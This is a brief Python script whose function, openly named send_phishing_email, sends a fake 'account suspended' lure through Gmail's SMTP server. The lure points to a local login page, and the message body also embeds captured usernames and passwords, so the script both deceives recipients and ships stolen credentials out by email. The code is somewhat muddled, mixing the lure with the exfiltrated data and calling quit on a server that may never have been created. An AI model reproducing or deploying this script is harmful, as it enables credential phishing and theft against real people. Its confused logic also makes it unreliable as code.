import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_phishing_email(sender_email, receiver_email, username, password):
    email_password = "Enter your password here"
    subject = "Account Suspended - Action Required"
    body = f"Dear User,\n\nYour account has been suspended. Please log in to verify your account:\nhttp://localhost:5000\n\nCaptured Credentials:\nUsername: {username}\nPassword: {password}"
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, email_password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        print(f"Email sent to {receiver_email}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.quit()
